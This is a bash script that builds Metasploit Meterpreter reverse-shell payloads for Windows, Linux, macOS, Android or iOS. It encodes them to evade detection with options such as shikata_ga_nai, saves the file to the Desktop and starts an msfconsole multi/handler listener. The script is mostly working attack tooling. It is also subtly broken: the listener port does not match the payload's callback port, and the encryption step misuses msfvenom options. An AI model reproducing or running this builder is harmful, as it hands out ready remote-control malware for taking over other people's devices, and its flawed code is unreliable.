#!/bin/bash

LHOST="$(ip route get 1 | awk '{print $NF;exit}')"
LPORT_TARGET=$(shuf -i 2000-65000 -n 1)
LPORT_LISTENER=4444

declare -A PAYLOADS=(
  ["1"]="windows/meterpreter/reverse_tcp"
  ["2"]="linux/x86/meterpreter/reverse_tcp"
  ["3"]="osx/x64/meterpreter/reverse_tcp"
  ["4"]="android/meterpreter/reverse_tcp"
  ["5"]="ios/meterpreter/reverse_tcp"
)

echo "Available payloads:"
echo "-------------------"
echo "1. Windows"
echo "2. Linux"
echo "3. macOS"
echo "4. Android"
echo "5. iOS"

read -p "Enter the number of the payload to use: " PAYLOAD_NUMBER
PAYLOAD_TYPE=${PAYLOADS[$PAYLOAD_NUMBER]}

read -p "Enter the payload format (e.g. exe): " PAYLOAD_FORMAT

declare -A ENCODINGS=(
  ["1"]="shikata_ga_nai"
  ["2"]="xor"
  ["3"]="bash"
  ["4"]="perl"
  ["5"]="python"
)

echo "Available encoding types:"
echo "------------------------"
echo "1. Shikata Ga Nai"
echo "2. XOR"
echo "3. BASH"
echo "4. Perl"
echo "5. Python"

read -p "Enter the number of the encoding type to use: " ENCODING_NUMBER
ENCODING_TYPE=${ENCODINGS[$ENCODING_NUMBER]}

declare -A ENCRYPTIONS=(
  ["1"]="aes256"
  ["2"]="rc4"
  ["3"]="xor"
  ["4"]="blowfish"
  ["5"]="des"
)

echo "Available encryption types:"
echo "--------------------------"
echo "1. AES256"
echo "2. RC4"
echo "3. XOR"
echo "4. BLOWFISH"
echo "5. DES"

read -p "Enter the number of the encryption type to use: " ENCRYPTION_NUMBER
ENCRYPTION_TYPE=${ENCRYPTIONS[$ENCRYPTION_NUMBER]}

echo "Generating encoded payload..."
ENCODED_PAYLOAD=$(msfvenom -p $PAYLOAD_TYPE LHOST=$LHOST LPORT=$LPORT_TARGET -f $PAYLOAD_FORMAT -e $ENCODING_TYPE)

echo "Generating encrypted shellcode..."
ENCRYPTED_SHELLCODE=$(msfvenom -p generic/custom PAYLOAD="$PAYLOAD_TYPE" LHOST=$LHOST LPORT=$LPORT_TARGET -e $ENCRYPTION_TYPE -f raw)

echo "Saving payload to Desktop..."
echo -n "$ENCODED_PAYLOAD" > $HOME/Desktop/payload.$PAYLOAD_FORMAT

echo "Starting Metasploit listener..."
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE; set LHOST $LHOST; set LPORT $LPORT_LISTENER; set ExitOnSession false; run -j"

echo "Done!"
